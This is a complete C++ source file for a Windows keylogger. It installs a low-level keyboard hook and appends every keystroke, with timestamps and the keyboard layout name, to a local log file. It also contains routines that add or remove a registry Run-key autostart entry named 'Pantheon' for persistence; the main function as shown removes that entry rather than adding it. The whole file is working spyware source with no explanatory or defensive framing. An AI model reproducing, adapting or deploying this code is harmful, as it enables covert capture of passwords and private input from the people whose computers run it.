#pragma optimize("gsy", on)

#define VC_EXTRALEAN
#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <iostream>
#include <fstream>

using namespace std;


WORD gTimer;
const LPWSTR LOGFILE = L"log.txt";


void GetTime()
{
	SYSTEMTIME lt;
	GetLocalTime(&lt);

	if (gTimer != lt.wMinute)
	{
		gTimer = lt.wMinute;
		ofstream log(LOGFILE, ios::app);
        log << "\n>>> Time: " << lt.wDay << "." << lt.wMonth << "." << lt.wYear
            << " " << lt.wHour << ":" << lt.wMinute << " <<<\n";
		log.close();
	}
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	BYTE keyState[256];
	wchar_t key[16];
	
	DWORD vkCode = ((KBDLLHOOKSTRUCT *)lParam)->vkCode;
	
	GetKeyState(VK_CAPITAL);
	GetKeyState(VK_NUMLOCK);
	GetKeyboardState(keyState);
	
	ofstream log(LOGFILE, ios::app);

	if (wParam == WM_KEYDOWN)
	{
		if (ToUnicode(vkCode, MapVirtualKey(vkCode, 0), keyState, (LPWSTR)&key,
            sizeof(key) / 2, 0))
		{
			GetTime();
			log << (char)key[0];
		}
	}
	log.close();

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void GetKeyboardLayoutText()
{
	HKEY hKey;
	DWORD type = REG_SZ; 
	wchar_t kbdRep[KL_NAMELENGTH];
	wchar_t kbdPath[51 + KL_NAMELENGTH];
	wchar_t kbdName[256];
	DWORD size;

	GetKeyboardLayoutName(kbdRep);
	swprintf_s(kbdPath,
        L"SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\%s", kbdRep);

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, kbdPath, 0, KEY_QUERY_VALUE, &hKey)
        == ERROR_SUCCESS)
	{
		RegQueryValueEx(hKey, L"Layout Text", NULL, &type, (LPBYTE)kbdName, &size);
		RegCloseKey(hKey);

		wofstream log(LOGFILE, ios::app);
        log << "\n\n*** Keyboard: " << kbdName << " ***";
		log.close();
	}
}

int WriteAutostart()
{
	HKEY hKey;
	DWORD type = REG_SZ;
	BYTE path[MAX_PATH];

	GetModuleFileName(NULL, (LPWSTR)path, MAX_PATH);

	if (RegOpenKeyEx(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE,
        &hKey) != ERROR_SUCCESS)
	{
		return 1;
	}
	RegSetValueEx(hKey, L"Pantheon", 0, type, path, sizeof(path));
	RegCloseKey(hKey);

	return 0;
}

int DeleteAutostart()
{
	HKEY hKey;

	if (RegOpenKeyEx(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE,
        &hKey) != ERROR_SUCCESS)
	{
		return 1;
	}
	RegDeleteValue(hKey, L"Pantheon");
	RegCloseKey(hKey); 

	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow)
{
	HHOOK hHook;
	HINSTANCE hMod;
	MSG msg;

    DeleteAutostart();
	GetKeyboardLayoutText();

	if (!(hMod = GetModuleHandle(NULL)))
	{
		return 1;
	}

	if (!(hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hMod, 0)))
	{
		return 1;
	}

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hHook);

	return 0;
}
